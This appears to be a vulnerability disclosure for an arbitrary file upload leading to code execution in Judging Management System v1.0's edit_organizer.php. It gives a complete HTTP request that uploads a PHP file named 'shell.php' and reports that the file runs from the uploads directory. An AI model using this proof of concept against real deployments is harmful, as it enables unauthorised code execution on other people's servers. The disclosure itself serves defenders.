# Judging Management System v1.0 by oretnom23 has arbitrary code execution (RCE)


vendors: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability url: ip/php-jms/edit_organizer.php

Loophole location: Judging Management System's "/php-jms/edit_organizer.php" file exists arbitrary file upload (RCE)

Request package for file upload：

​```sql
POST /php-jms/edit_organizer.php HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.88/php-jms/edit_organizer.php
Cookie: PHPSESSID=f6bhcgo222sk31fnm99nf9tjt1
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------227772473631172
Content-Length: 1760

-----------------------------227772473631172
Content-Disposition: form-data; name="fname"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="mname"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="lname"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="email"

admin@qq.com
-----------------------------227772473631172
Content-Disposition: form-data; name="pnum"

18888888888
-----------------------------227772473631172
Content-Disposition: form-data; name="cname"

111
-----------------------------227772473631172
Content-Disposition: form-data; name="caddress"

111
-----------------------------227772473631172
Content-Disposition: form-data; name="ctelephone"

11
-----------------------------227772473631172
Content-Disposition: form-data; name="cemail"

11
-----------------------------227772473631172
Content-Disposition: form-data; name="cwebsite"

11
-----------------------------227772473631172
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------227772473631172
Content-Disposition: form-data; name="username"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="passwordx"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="password2x"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="password"

admin
-----------------------------227772473631172
Content-Disposition: form-data; name="update"


-----------------------------227772473631172--
​```

The files will be uploaded to this directory \php-jms\uploads
![image](https://user-images.githubusercontent.com/54017627/206372647-156724a1-ba02-4de5-99ca-5bdc77ae89fb.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/206372790-7ac93294-9a0a-4677-b9ab-e595d102267b.png)
